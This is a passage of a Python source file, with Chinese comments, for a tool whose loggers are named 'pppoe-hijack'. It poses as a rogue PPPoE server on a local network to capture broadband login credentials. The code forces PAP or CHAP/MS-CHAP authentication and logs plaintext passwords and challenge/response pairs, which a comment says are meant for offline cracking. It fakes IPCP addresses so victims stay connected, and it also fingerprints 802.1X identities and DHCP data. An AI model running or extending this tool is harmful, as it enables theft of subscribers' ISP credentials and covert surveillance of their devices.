        log.debug("[*] 回收会话 %s sessionid=%#06x", s.mac, s.sid)

    def _session(self, pkt, vlan: bytes = b"") -> List[bytes]:
        lyr = pppoe_layer(pkt)
        sid = lyr.sessionid if lyr is not None else 0
        mac = norm_mac(pkt.src)
        s = self.sessions.get((mac, sid))
        if s is None:
            # 没见过这个 sessionid：可能是第二轮拨号，也可能 PADS 丢了解析
            if self.cfg.multi_session or not any(m == mac for (m, _) in self.sessions):
                s = self._new_session(mac, sid or None, vlan=vlan)
            else:
                s = self._lookup(mac, 0)
        if s is None:
            return []
        s.last_seen = self.clock()
        s.pending = False
        if vlan and not s.vlan:
            s.vlan = vlan

        ppp = find_layer(pkt, PPP)
        if ppp is None:
            return []
        proto = ppp.proto
        payload = bytes(ppp.payload)
        self.stats["rx_%04x" % proto] += 1
        if not payload:
            return []

        # 重传去重：同一 (proto, code, id, 载荷) 原样重发上次的回包
        key = (proto, payload[0], payload[1] if len(payload) > 1 else 0, payload)
        cached = s.replied.get(key)
        if cached is not None:
            self.stats["retransmit"] += 1
            log.debug("[*] 重传去重 %s proto=%#06x code=%d id=%d", mac, proto, payload[0], key[2])
            return list(cached)

        frames = self._dispatch(s, proto, payload)
        s.replied[key] = list(frames)
        if len(s.replied) > 64:                    # 上限，避免内存增长
            s.replied.clear()
        return frames

    def _dispatch(self, s: Session, proto: int, payload: bytes) -> List[bytes]:
        if proto == PROTO_LCP:
            return self.send_lcp_req(s, payload)
        if proto == PROTO_PAP:
            return self.get_papinfo(s, payload)
        if proto == PROTO_CHAP:
            return self.handle_chap(s, payload)
        if proto == PROTO_IPCP:
            return self.handle_ipcp(s, payload)
        if proto == PROTO_IPV6CP:
            return self.handle_ipv6cp(s, payload)       # 双栈光猫会协商它
        if proto in (PROTO_IPV4, PROTO_IPV6):
            if not s.data_logged:
                s.data_logged = True
                log.info("[*] %s 开始承载 IP 流量（proto=%#06x，本工具不转发）", s.mac, proto)
            return []
        return []

    # ------------------------------------------------ LCP

    def send_lcp_req(self, s: Session, payload: bytes) -> List[bytes]:
        """处理 LCP 帧（原版只处理 Config-Req）。"""
        if len(payload) < 2:
            return []
        code = payload[0]
        ident = payload[1]
        body = payload[4:]

        if code == CONF_REQ:
            return self._answer_lcp_conf_req(s, ident, body)
        if code in (CONF_ACK, CONF_NAK, CONF_REJ):
            return self._handle_our_lcp_response(s, code, body)
        if code == ECHO_REQ:
            # 不回 Echo-Reply，客户端几十秒后就判定链路 down 重拨
            self.stats["echo"] += 1
            return self._echo_reply(s, payload)
        if code == TERM_REQ:
            log.info("[*] 客户端 %s 请求终止 LCP，回收会话 sid=%#06x", s.mac, s.sid)
            frames = [self._sess(s.mac, s.sid, PROTO_LCP, lcp_frame(TERM_ACK, ident, body))]
            self._drop(s)
            return frames
        if code == TERM_ACK:
            self._drop(s)
            return []
        if code == CODE_REJ:
            log.info("[!] 客户端 Code-Reject: %s", body.hex())
            return []
        if code == PROT_REJ:
            log.info("[!] 客户端 Protocol-Reject: %s", body.hex())
            return []
        return []

    def _echo_reply(self, s: Session, payload: bytes) -> List[bytes]:
        """Echo-Reply: code=10，id 与 Magic-Number 原样回显"""
        body = payload[4:]
        if len(body) >= 4:
            body = MAGIC_OPTION[2:]                # 回显同样的 magic（4 字节）
        return [self._sess(s.mac, s.sid, PROTO_LCP, lcp_frame(ECHO_REPLY, payload[1], body))]

    def _answer_lcp_conf_req(self, s: Session, ident: int, body: bytes) -> List[bytes]:
        """回客户端的 LCP-Config-Req。

        规范做法（--lcp-mode nak，默认）：
          - 认证协议已经是我们要的 → Ack 那些选项
          - 不是 / 客户端压根没提 → 用 Nak 要求（或塞入）我们的认证协议
        原版做法（--lcp-mode reject）：把客户端选项全部 Reject，再下发自己的 Req。
        """
        opts = parse_options(body)
        frames: List[bytes] = []
        accept_ident = ident

        if self.cfg.lcp_mode == "reject":
            if opts:
                frames.append(self._sess(s.mac, s.sid, PROTO_LCP,
                                         lcp_frame(CONF_REJ, ident, b"".join(opts))))
        else:
            accepted, wanted, rejected = [], [], []
            saw_auth = False
            for opt in opts:
                if opt[0] in LCP_MUST_REJECT:
                    # RFC 2516 §7：AC 侧 MUST 拒绝 ACFC/ACCM/FCS-Alternatives/PFC/Quality
                    rejected.append(opt)
                elif opt[0] == OPT_AUTH_PROTOCOL:
                    saw_auth = True
                    proto, algo = parse_auth_proto(opt)
                    if AUTH_BY_ALGO.get((proto, algo)) == s.auth_kind:
                        accepted.append(opt)
                    else:
                        wanted.append(AUTH_OPTION[s.auth_kind])
                else:
                    accepted.append(opt)
            if not saw_auth:
                # authenticator 的权利：Nak 把 Auth-Protocol 塞进去
                wanted.append(AUTH_OPTION[s.auth_kind])
            if accepted:
                frames.append(self._sess(s.mac, s.sid, PROTO_LCP,
                                         lcp_frame(CONF_ACK, accept_ident, b"".join(accepted))))
            if rejected:
                log.info("[*] 拒绝客户端 LCP 选项（RFC 2516 §7 禁止）: %s",
                         [o[0] for o in rejected])
                frames.append(self._sess(s.mac, s.sid, PROTO_LCP,
                                         lcp_frame(CONF_REJ, ident, b"".join(rejected))))
            if wanted:
                frames.append(self._sess(s.mac, s.sid, PROTO_LCP,
                                         lcp_frame(CONF_NAK, ident, b"".join(wanted))))
                s.nak_count += 1
                log.info("[*] %s 认证协议未定 → Nak 要求 %s", s.mac, s.auth_kind)

        if s.lcp == "initial":                    # 首次接触：下发我们自己的 Conf-Req
            frames += self.send_lcp_req_packet(s)
        return frames

    def _handle_our_lcp_response(self, s: Session, code: int, body: bytes) -> List[bytes]:
        """处理客户端对我方 LCP-Config-Req 的 Ack / Nak / Reject"""
        opts = parse_options(body)

        if code == CONF_ACK:
            if s.lcp != "up":
                s.lcp = "up"
                log.info("[*] LCP 协商完成 %s auth=%s", s.mac, s.auth_kind)
            frames: List[bytes] = []
            if s.auth_kind.startswith("mschap") or s.auth_kind == "chap":
                frames += self.send_chap_challenge(s)
            return frames

        if code == CONF_NAK:
            wanted = None
            for opt in opts:
                if opt[0] == OPT_AUTH_PROTOCOL:
                    proto, algo = parse_auth_proto(opt)
                    wanted = AUTH_BY_ALGO.get((proto, algo))
                    if wanted is None:
                        log.info("[!] 客户端要求我们不支持的认证协议 %#06x algo=%s",
                                 proto, algo)
            if (wanted and wanted != s.auth_kind and wanted in self.cfg.auth_list
                    and s.auth_switches < self.cfg.auth_retry):
                s.auth_switches += 1
                log.info("[*] 客户端 Nak 要求 %s → 切换认证协议 %s→%s",
                         wanted, s.auth_kind, wanted)
                s.auth_kind = wanted
                s.replied.clear()
                return self.send_lcp_req_packet(s)
            if wanted and wanted not in self.cfg.auth_list:
                log.info("[!] 客户端要求 %s，但它不在 --auth-order %s 里，保持 %s",
                         wanted, ",".join(self.cfg.auth_list), s.auth_kind)
            for opt in opts:                       # 其它选项被 Nak：下次不再提
                if opt[0] != OPT_AUTH_PROTOCOL:
                    s.bad_options.add(opt[0])
            return self.send_lcp_req_packet(s)

        if code == CONF_REJ:
            for opt in opts:
                s.bad_options.add(opt[0])
            log.info("[*] 客户端 Reject 我方选项: %s", [o[0] for o in opts])
            if OPT_AUTH_PROTOCOL in s.bad_options:
                s.bad_options.discard(OPT_AUTH_PROTOCOL)   # 认证是必须的，不能真丢
                nxt = self._next_auth(s)
                if nxt and s.auth_switches < self.cfg.auth_retry:
                    s.auth_switches += 1
                    log.info("[*] 认证协议被拒 → %s→%s", s.auth_kind, nxt)
                    s.auth_kind = nxt
                    s.replied.clear()
            return self.send_lcp_req_packet(s)

        return []

    def _next_auth(self, s: Session) -> Optional[str]:
        order = self.cfg.auth_list
        try:
            i = order.index(s.auth_kind)
        except ValueError:
            return order[0]
        return order[i + 1] if i + 1 < len(order) else None

    def _mru_for(self, s: Session) -> int:
        """我方要提议的 MRU。

        RFC 4638：客户端没在 PADR 带 PPP-Max-Payload(0x0120) 时，>1492 的 MRU
        不该出现；带了就以它为上限。默认仍提议 1500（= 2016 原版字节行为），
        想严格走 4638 的保守路线用 --mru 1492 / --profile ont。
        """
        want = int(self.cfg.mru)
        if s.max_payload:
            return max(576, min(want, s.max_payload))
        return max(576, min(want, 1500))

    def _lcp_req_options(self, s: Session) -> bytes:
        base = [mru_option(self._mru_for(s)), AUTH_OPTION[s.auth_kind], MAGIC_OPTION]
        opts = [o for o in base
                if o[0] == OPT_AUTH_PROTOCOL or o[0] not in s.bad_options]
        if not self.cfg.strict_rfc:
            return b"".join(opts) + V1_TAIL
        return b"".join(opts)

    def send_lcp_req_packet(self, s: Session) -> List[bytes]:
        """下发我方的 LCP-Config-Req（把认证协议钉成当前的 auth_kind）。

        Length 字段（RFC 1661 规定含 4 字节头）：
          --strict-rfc：options 只留 MRU/Auth/Magic 14 字节，Length = 4+14 = 18（规范）
          默认（原版行为）：options 后面再跟 4 个 0x00，Length 仍写 18，
                         于是这 4 个字节落在声明长度之外 —— 与原版逐字节相同。
        """
        opts = self._lcp_req_options(s)
        s.req_ident = (s.req_ident % 0xFF) + 1
        length = 4 + len(opts) if self.cfg.strict_rfc else len(opts)
        payload = lcp_frame(CONF_REQ, s.req_ident, opts, length=length)
        s.lcp = "req_sent"
        s.last_req = self.clock()
        s.retries = 0
        self.stats["lcp_req"] += 1
        log.info("下发 LCP-Config-Req（认证协议=%s, id=%d）", s.auth_kind, s.req_ident)
        return [self._sess(s.mac, s.sid, PROTO_LCP, payload)]

    def send_lcp_ack_packet(self, s: Session, ident: int, opts: bytes = b"") -> List[bytes]:
        return [self._sess(s.mac, s.sid, PROTO_LCP, lcp_frame(CONF_ACK, ident, opts))]

    def send_lcp_reject_packet(self, s: Session, ident: int, opts: bytes = b"") -> List[bytes]:
        return [self._sess(s.mac, s.sid, PROTO_LCP, lcp_frame(CONF_REJ, ident, opts))]

    # ------------------------------------------------ CHAP

    def send_chap_challenge(self, s: Session) -> List[bytes]:
        """作为认证方主动发 Challenge。challenge 是我们自己造的，
        所以 Challenge+Response 一定成对拿到 —— 离线爆破不需要碰运气。
        """
        if s.chap_sent:
            return []
        s.chap_ident = (s.chap_ident % 0xFF) + 1
        s.chap_value = os.urandom(16)
        s.chap_sent = True
        payload = auth_frame(CHAP_CHALLENGE, s.chap_ident, 16, s.chap_value,
                             self.ac_name.encode("utf-8"))
        self.stats["chap_challenge"] += 1
        log.info("[*] 下发 CHAP Challenge (%s) id=%d challenge=%s",
                 s.auth_kind, s.chap_ident, s.chap_value.hex())
        return [self._sess(s.mac, s.sid, PROTO_CHAP, payload)]

    def handle_chap(self, s: Session, payload: bytes) -> List[bytes]:
        if not payload or payload[0] != CHAP_RESPONSE:
            return []
        ident = payload[1]
        value, name = split_auth(payload)
        rec = {"auth": s.auth_kind,
               "username": name.decode("utf-8", "replace"),
               "auth_challenge": s.chap_value.hex(),
               "raw": payload.hex()}
        if s.auth_kind == "mschapv2":
            rec.update(parse_mschapv2(value))
        elif s.auth_kind == "mschapv1" and len(value) >= 48:
            rec.update({"lm_response": value[0:24].hex(),
                        "nt_response": value[24:48].hex()})
        else:
            rec["response"] = value.hex()
        self._store(rec, s)
        credlog.info("[+] CHAP 凭据 (%s) user=%r challenge=%s response=%s",
                     s.auth_kind, rec["username"], rec["auth_challenge"],
                     rec.get("nt_response") or rec.get("response") or "")
        credlog.info("get User:%s,Pass:(chap-%s)", rec["username"], s.auth_kind)

        if self.cfg.chap_reply == "success":
            s.authed = True
            return [self._sess(s.mac, s.sid, PROTO_CHAP,
                               auth_frame(CHAP_SUCCESS, ident, 1, b"\x00"))]
        return [self._sess(s.mac, s.sid, PROTO_CHAP,
                           auth_frame(CHAP_FAILURE, ident, 1, b"\x00"))]

    # ------------------------------------------------ PAP

    def get_papinfo(self, s: Session, payload: bytes) -> List[bytes]:
        if not payload or payload[0] != PAP_AUTH_REQ:
            return []
        ident = payload[1]
        user, passwd = self._parse_pap(payload)
        uname = user.decode("utf-8", "replace")
        upass = passwd.decode("utf-8", "replace")
        self._store({"auth": "pap", "username": uname, "password": upass,
                     "raw": payload.hex()}, s)
        credlog.info("[+] PAP 明文凭据 user=%r pass=%r (mac=%s sid=%#06x)",
                     uname, upass, s.mac, s.sid)
        credlog.info("get User:%s,Pass:%s", uname, upass)   # 原版日志，便于 grep

        if self.cfg.pap_mode == "ack":
            s.authed = True
            log.info("[*] PAP 回 Ack（会话保留，继续 IPCP）")
            return [self._sess(s.mac, s.sid, PROTO_PAP,
                               auth_frame(PAP_AUTH_ACK, ident, 1, b"\x00"))]
        # 原版是固定 id=2 的 Nak；这里回显客户端的 id（有的客户端会忽略不匹配的 Nak）
        log.info("欺骗完毕....（PAP Nak，id=%d）", ident)
        return [self._sess(s.mac, s.sid, PROTO_PAP,
                           auth_frame(PAP_AUTH_NAK, ident, 1, b"\x00"))]

    @staticmethod
    def _parse_pap(payload: bytes) -> Tuple[bytes, bytes]:
        """PAP Authenticate-Request 载荷:
            01 | id | len(2) | ulen(1) | user | plen(1) | pass
        """
        if len(payload) < 6:
            return b"", b""
        ulen = payload[4]
        if 5 + ulen + 1 > len(payload):
            return b"", b""
        plen = payload[5 + ulen]
        return payload[5:5 + ulen], payload[6 + ulen:6 + ulen + plen]

    # ------------------------------------------------ IPCP

    def handle_ipcp(self, s: Session, payload: bytes) -> List[bytes]:
        """完成 IPCP：给客户端一个假地址、我们自己给一个假网关地址。

        目的不是转发（本工具不做转发），而是让客户端「觉得自己在线」，
        不立刻重拨 —— 比抓一次账号就把它赶走更有价值。
        """
        if not self.cfg.ipcp_enabled or len(payload) < 2:
            return []
        code, ident = payload[0], payload[1]
        body = payload[4:]
        peer = ip_bytes(self.cfg.ipcp_peer)
        local = ip_bytes(self.cfg.ipcp_local)
        frames: List[bytes] = []

        if code == CONF_REQ:
            accepted, wanted = [], []
            for opt in parse_options(body):
                if opt[0] == IPCP_OPT_IP_ADDR and len(opt) >= 6:
                    if opt[2:6] == peer or s.ipcp_nak >= 3:
                        accepted.append(opt)
                        s.ipcp_ip = ".".join(str(b) for b in opt[2:6])
                    else:
                        wanted.append(b"\x03\x06" + peer)
                else:
                    accepted.append(opt)
            if accepted:
                frames.append(self._sess(s.mac, s.sid, PROTO_IPCP,
                                         lcp_frame(CONF_ACK, ident, b"".join(accepted))))
            if wanted:
                s.ipcp_nak += 1
                frames.append(self._sess(s.mac, s.sid, PROTO_IPCP,
                                         lcp_frame(CONF_NAK, ident, b"".join(wanted))))
            if not s.ipcp_req_sent:
                s.ipcp_req_sent = True
                frames.append(self._sess(s.mac, s.sid, PROTO_IPCP,
                                         lcp_frame(CONF_REQ, 0x01, b"\x03\x06" + local)))
                log.info("[*] IPCP 下发虚拟地址 peer=%s local=%s",
                         self.cfg.ipcp_peer, self.cfg.ipcp_local)
            return frames

        if code == CONF_NAK:
            for opt in parse_options(body):
                if opt[0] == IPCP_OPT_IP_ADDR and len(opt) >= 6:
                    s.ipcp_ip = ".".join(str(b) for b in opt[2:6])
            return []
        if code == CONF_ACK:
            if s.ipcp_ip:
                log.info("[*] IPCP 完成，客户端 %s 地址=%s", s.mac, s.ipcp_ip)
            return []
        return []

    # ------------------------------------------------ IPv6CP（双栈光猫）

    def handle_ipv6cp(self, s: Session, payload: bytes) -> List[bytes]:
        """IPv6CP（RFC 5072）：双栈光猫拨号后会先协商 Interface-Identifier。

        我们不转发 IPv6 流量，只需要把这条协商应下来，让客户端别因为
        「IPv6CP 无响应」而把整条会话重拨：
        - Conf-Req：原样 Ack，同时取走它的 IID；再补一条我们自己的 Conf-Req；
        - Conf-Ack/Nak/Rej：只记录 IID；
        - Echo-Req：回 Echo-Reply（同 LCP 的保活语义）。
        """
        if not self.cfg.ipv6cp_enabled or len(payload) < 2:
            return []
        code, ident = payload[0], payload[1]
        body = payload[4:]
        frames: List[bytes] = []

        if code == CONF_REQ:
            frames.append(self._sess(s.mac, s.sid, PROTO_IPV6CP,
                                     lcp_frame(CONF_ACK, ident, body)))
            got = self._iid_from_options(body)
            if got:
                s.ipv6_iid = got
            if not s.ipv6cp_req_sent:
                s.ipv6cp_req_sent = True
                mine = self._iid_for(s)
                frames.append(self._sess(s.mac, s.sid, PROTO_IPV6CP,
                                         lcp_frame(CONF_REQ, 0x01, b"\x01\x0a" + mine)))
                log.info("[*] IPv6CP 已协商（我方 IID=%s，客户端 %s）", mine.hex(), s.mac)
            return frames

        if code in (CONF_ACK, CONF_NAK, CONF_REJ):
            got = self._iid_from_options(body)
            if got:
                s.ipv6_iid = got
            return []
        if code == ECHO_REQ:
            return [self._sess(s.mac, s.sid, PROTO_IPV6CP,
                               lcp_frame(ECHO_REPLY, ident, body))]
        return []

    @staticmethod
    def _iid_from_options(body: bytes) -> str:
        for opt in parse_options(body):
            if opt[0] == IPV6CP_OPT_IID and len(opt) >= 10:
                return opt[2:10].hex()
        return ""

    def _iid_for(self, s: Session) -> bytes:
        """我方 Interface-Identifier：--ipv6cp-iid 优先，否则按客户端 MAC 生成 EUI-64"""
        if self.cfg.iid_bytes:
            return self.cfg.iid_bytes
        b = bytearray(mac_bytes(s.mac))
        b[0] ^= 0x02                                  # RFC 5072：本地管理位置位
        return bytes(b[:3]) + b"\xff\xfe" + bytes(b[3:])

    # ------------------------------------------------ 802.1X / DHCP 指纹

    def _handle_eapol(self, pkt) -> List[bytes]:
        """旁听 802.1X（PPPoE 之前那道企业/光猫认证）——只记录身份，从不回应。

        现代运营商光猫在桥接模式下常先跑 802.1X：EAP-Response/Identity 里的
        用户名往往就是宽带账号（不带密码）。把它记下来，能在 PPPoE 里对上号。
        """
        if self.cfg.eapol != "log":
            return []
        self.stats["eapol"] += 1
        mac = norm_mac(pkt.src)
        kind, identity = eap_identity(pkt)
        if not identity:
            return []
        key = (mac, identity)
        if key in self._eapol_seen:
            return []
        self._eapol_seen.add(key)
        rec = self._store_event({"kind": "eapol", "mac": mac, "auth": kind,
                                 "eapol_identity": identity, "username": identity})
        log.info("[*] 802.1X %s身份=%r ← %s%s", kind, identity, mac,
                 (" [%s]" % rec["vendor"]) if rec.get("vendor") else "")
        return []

    def _handle_dhcp(self, pkt) -> List[bytes]:
        """旁听客户端的 DHCP 请求，抓设备指纹（主机名/厂商类/客户端标识）。

        Option 60(Vendor Class) 能直接看出接入设备是哪种光猫/路由器，
        Option 61(Client-ID) 常带 MAC 或运营商标识，可用于区分同一 NAT 后的设备。
        """
        if self.cfg.dhcp != "log":
            return []
        info = parse_dhcp(pkt)
        if not info:
            return []
        self.stats["dhcp"] += 1
        mac = norm_mac(info.pop("mac", None) or pkt.src)
        key = (mac, info.get("hostname", ""), info.get("client_id", ""))
        if key in self._dhcp_seen:
            return []
        self._dhcp_seen.add(key)
        info.update({"kind": "dhcp", "mac": mac})
        rec = self._store_event(info)
        log.info("[*] DHCP 指纹 %s hostname=%r vendor_class=%r client_id=%r",
                 mac, rec.get("hostname", ""), rec.get("vendor_class", ""),
                 rec.get("client_id", ""))
        return []

    # ------------------------------------------------ 落盘 / 统计 / 回收

    def _store_event(self, rec: dict, s: Optional[Session] = None) -> dict:
        """记录旁路指纹（802.1X / DHCP）：与凭据同表但用 kind 区分"""
        out = {"ts": time.strftime("%Y-%m-%d %H:%M:%S"),
               "iface": self.cfg.iface or str(conf.iface),
               "bras_mac": self.mac, "ac_name": self.ac_name}
        if s is not None:
            out["sessionid"] = "%#06x" % s.sid
            out["vlan"] = vlan_summary(s.vlan) if s.vlan else ""
        out.update(rec)
        if out.get("mac"):
            out.setdefault("vendor", oui_vendor(out["mac"], self.cfg.oui_table))
        self.events.append(out)
        self.stats["events"] += 1
        if self.store is not None:
            self.store.add(out)
        return out

    def _store(self, rec: dict, s: Session):
        rec = dict(rec)
        rec.setdefault("kind", "cred")
        rec.setdefault("mac", s.mac)
        rec.setdefault("sessionid", "%#06x" % s.sid)
        rec.setdefault("bras_mac", self.mac)
        rec.setdefault("ac_name", self.ac_name)
        rec.setdefault("iface", self.cfg.iface or str(conf.iface))
        # 现代设备相关的上下文一起落盘，方便事后对号（哪个 VLAN / 哪台光猫）
        rec.setdefault("vendor", s.vendor or oui_vendor(s.mac, self.cfg.oui_table))
        rec.setdefault("vlan", vlan_summary(s.vlan) if s.vlan else "")
        rec.setdefault("service_name", s.service_name)
        rec.setdefault("host_uniq", s.host_uniq.hex() if s.host_uniq else "")
        rec.setdefault("relay_sid", s.relay_sid.hex() if s.relay_sid else "")
        rec.setdefault("max_payload", s.max_payload or "")
        rec.setdefault("ipv6_iid", s.ipv6_iid)
        self.creds.append(rec)
        self.stats["creds"] += 1
        if self.store is not None:
            self.store.add(rec)

    def reap(self):
        """周期性维护：会话 TTL 回收 + 我方 Config-Req 重传。"""
        now = self.clock()
        ttl = self.cfg.session_ttl
        if ttl:
            for key, s in list(self.sessions.items()):
                if now - s.last_seen > ttl:
                    log.info("[*] 会话超时回收 %s (sid=%#06x)", s.mac, s.sid)
                    self._drop(s)
            for mac, s in list(self.pending.items()):
                if ttl and now - s.created > ttl and (mac, s.sid) not in self.sessions:
                    self.pending.pop(mac, None)           # PADR 一直没来
        for s in list(self.sessions.values()):
            if s.lcp != "req_sent" or now - s.last_req < self.cfg.lcp_retry:
                continue
            if s.retries < self.cfg.lcp_maxretry:
                n = s.retries + 1
                log.info("[*] 重传 LCP-Config-Req %s (%d/%d)",
                         s.mac, n, self.cfg.lcp_maxretry)
                self._tx(self.send_lcp_req_packet(s))
                s.retries = n                     # send_lcp_req_packet 会清零，这里补回来
            elif s.retries == self.cfg.lcp_maxretry:
                s.retries += 1
                log.warning("[!] %s LCP-Config-Req 重传 %d 次无响应，放弃",
                            s.mac, self.cfg.lcp_maxretry)

    def summary(self):
        st = self.stats
        log.info("[*] 统计: 收包=%d PADI=%d PADR=%d 会话=%d 凭据=%d 重传去重=%d "
                 "自环丢弃=%d LCP-Req=%d",
                 st["pkts"], st["padi"], st["padr"], len(self.sessions),
                 self.stats["creds"], st["retransmit"], st["self_loop"], st["lcp_req"])
        if (st["vlan"] or st["eapol"] or st["dhcp"] or st["service_name_error"]
                or st["cookie_miss"] or any(k.startswith("rx_8057") for k in st)):
            log.info("[*] 现代设备: VLAN 帧=%d Service-Name 拒绝=%d AC-Cookie 不回=%d "
                     "802.1X=%d DHCP=%d IPv6CP=%d 指纹记录=%d",
                     st["vlan"], st["service_name_error"], st["cookie_miss"],
                     st["eapol"], st["dhcp"], st["rx_8057"], st["events"])

    def finish(self):
        if self.store is not None:
            self.store.close()
        self.summary()


# ---------------------------------------------------------------- 运行模式

def build_bpf(cfg: Config, mac: str) -> str:
    """BPF 过滤器。

    现代光猫的 PPPoE 往往跑在 VLAN（甚至 QinQ）里 —— 带 tag 时以太 type 是
    0x8100/0x88a8，所以必须把 `vlan` 关键字也放进来，否则一个包都看不到。
    """
    bpf = "(ether proto 0x8863 or ether proto 0x8864) and not ether src %s" % mac
    if cfg.dst_filter == "strict":
        bpf += " and (ether dst %s or ether dst %s)" % (mac, BROADCAST)
    if cfg.eapol == "log":
        bpf = "(%s) or (ether proto 0x888e and not ether src %s)" % (bpf, mac)
    if cfg.dhcp == "log":
        bpf = "(%s) or (udp and (port 67 or port 68) and not ether src %s)" % (bpf, mac)
    if cfg.vlan_mode != "off":
        # 0x8100 = 802.1Q，0x88a8 = 802.1ad(QinQ)。libpcap 的 vlan 关键字只拆一层，
        # QinQ 再套一层 `vlan` 才能看见内层的 PPPoE。
        inner = "(ether proto 0x8863 or ether proto 0x8864)"
        bpf = "(%s) or (((vlan and vlan %s) or (vlan and vlan and vlan %s)) and not ether src %s)" % (
            bpf, inner, inner, mac)
    return bpf


def _iface_up(itf) -> str:
    """scapy 各后端对 flags 的表示不一致（Windows 恒为 0），无法判断就老实显示 '-'。"""
    flags = getattr(itf, "flags", 0)
    if isinstance(flags, int):
        if flags == 0:
            return "-"
        return "up" if flags & 0x1 else "-"          # IFF_UP
    text = str(flags).lower()
    if "up" in text:
        return "up"
    if "down" in text:
        return "down"
    return "-"


def print_ifaces():
    print("%-16s %-18s %-5s %s" % ("NAME", "MAC", "UP", "DESCRIPTION"))
    for itf in get_working_ifaces():
        try:
            mac = get_if_hwaddr(itf)
        except Exception:
            mac = "?"
        print("%-16s %-18s %-5s %s" % (getattr(itf, "name", "?"), mac,
                                       _iface_up(itf),
                                       getattr(itf, "description", "")))


def run_replay(cfg: Config, engine: PPPoEServer) -> int:
    """离线回放 pcap —— 不需要 Npcap，用来做回归/复现。"""
    sender = L2Sender(cfg.iface) if cfg.replay_send else DryRunSender(cfg.pcap_out)
    engine.emit = sender.send
    n = 0
    try:
        with PcapReader(cfg.replay) as reader:
            for pkt in reader:
                n += 1
                engine.handle_guard(pkt)
    except FileNotFoundError:
        log.error("找不到回放文件: %s", cfg.replay)
        return 2
    finally:
        engine.finish()
        sender.close()
    log.info("[*] 回放完成: 输入 %d 帧 / 我方发出 %d 帧", n, sender.count)
    return 0


def run_live(cfg: Config, engine: PPPoEServer) -> int:
    tx_queue: "queue.Queue" = queue.Queue()
    engine.emit = tx_queue.put
    if cfg.dry_run:
        sender = DryRunSender(cfg.pcap_out)
    else:
        try:
            sender = L2Sender(cfg.iface)
        except Exception as exc:
            log.error("无法建立二层发送通道: %s", exc)
            log.error("Windows: 安装 Npcap 并在安装时勾选 'Install Npcap in WinPcap "
                      "API-compatible Mode'；Linux: 需要 root + libpcap")
            return 2
    limiter = RateLimiter(cfg.rate) if cfg.rate else None
    bpf = build_bpf(cfg, engine.mac)
    log.info("[*] 网卡=%s 伪装MAC=%s BPF=%s", cfg.iface or conf.iface, engine.mac, bpf)
    log.info("[*] 认证顺序=%s PAP=%s CHAP回复=%s IPCP=%s 限速=%s 存储=%s",
             ",".join(cfg.auth_list), cfg.pap_mode, cfg.chap_reply,
             "on" if cfg.ipcp_enabled else "off",
             ("%d pps" % cfg.rate) if cfg.rate else "off", cfg.store)
    log.info("[*] 现代设备: profile=%s VLAN=%s(prio=%d) MRU=%d MaxPayload=%s AC-Cookie=%s "
             "Relay-SID=%s 多拨=%s IPv6CP=%s 802.1X=%s DHCP=%s Service-Strict=%s",
             cfg.profile or "-", cfg.vlan_mode,
             cfg.vlan_prio, cfg.mru, cfg.max_payload or "off",
             "on" if cfg.ac_cookie else "off", "on" if cfg.relay_sid else "off",
             "on" if cfg.multi_session else "off",
             "on" if cfg.ipv6cp_enabled else "off", cfg.eapol, cfg.dhcp,
             "on" if cfg.service_strict else "off")

    sniffer = AsyncSniffer(iface=cfg.iface, filter=bpf, prn=engine.handle_guard, store=False)

    stop = threading.Event()

    def _sender_loop():
        while not stop.is_set():
            try:
                frame = tx_queue.get(timeout=0.2)
            except queue.Empty:
                continue
            if frame is None:
                break
            if limiter is not None:
                limiter.wait()
            try:
                sender.send(frame)
            except Exception:
                log.debug("发送失败", exc_info=True)

    threading.Thread(target=_sender_loop, name="pppoe-tx", daemon=True).start()
    rc = 0
    try:
        # AsyncSniffer 在子线程里跑 sniff()，缺 Npcap 时异常不会在 start() 抛出，
        # 而是记在 sniffer.exception 上 —— 两种都要报成人话再退出。
        sniffer.start()
        time.sleep(0.4)
        err = getattr(sniffer, "exception", None)
        if err is not None:
            raise err
        log.info("[*] 已开始监听（Ctrl-C 退出）")
        last_stats = time.time()
        while True:
            time.sleep(1.0)
            err = getattr(sniffer, "exception", None)
            if err is not None:                   # 跑着跑着挂了（例如网卡被拔）
                log.error("抓包线程异常退出: %s", err)
                rc = 2
                break
            engine.reap()
            if cfg.stats and time.time() - last_stats >= cfg.stats:
                last_stats = time.time()
                engine.summary()
    except KeyboardInterrupt:
        log.info("[*] 收到中断，正在退出…")
    except Exception as exc:
        log.error("抓包失败: %s", exc)
        log.error("通常是没有 Npcap/libpcap；如需离线回归请用 --replay <pcap>")
        rc = 2
    finally:
        stop.set()
        tx_queue.put(None)
        try:
            sniffer.stop()
        except Exception:
            pass
        engine.finish()
        sender.close()
    return rc


def setup_logging(quiet: bool = False, verbose: bool = False):
    """logging + 队列：嗅探/发送线程只往队列里放，I/O 由监听线程做。"""
    handler = logging.StreamHandler(sys.stderr)
    handler.setFormatter(logging.Formatter(LOG_FORMAT))
    q = queue.SimpleQueue()
    listener = logging.handlers.QueueListener(q, handler, respect_handler_level=True)
    # -v 打开 DEBUG（每个报文的协议/选项级别细节），默认 INFO，-q 只留 WARNING
    level = logging.DEBUG if verbose else (logging.WARNING if quiet else logging.INFO)
    for name, lv in (("pppoe-hijack", level),
                     ("pppoe-hijack.creds", logging.INFO)):
        lg = logging.getLogger(name)
        lg.handlers.clear()
        lg.setLevel(lv)
        lg.propagate = False
        lg.addHandler(logging.handlers.QueueHandler(q))
    listener.start()
    return listener


def main(argv=None) -> int:
    cfg = build_config(argv)
    if cfg.list_ifaces:
        print_ifaces()
        return 0

    listener = setup_logging(cfg.quiet, cfg.debug)
    engine = PPPoEServer(cfg)
    engine.store = Store(cfg.store)
    try:
        if cfg.replay:
            return run_replay(cfg, engine)
        return run_live(cfg, engine)
    finally:
        if engine.store is not None:
            engine.store.close()
        listener.stop()
        if engine.creds:
            sys.stderr.write("[*] 本次共捕获 %d 条凭据\n" % len(engine.creds))


if __name__ == "__main__":
    sys.exit(main())
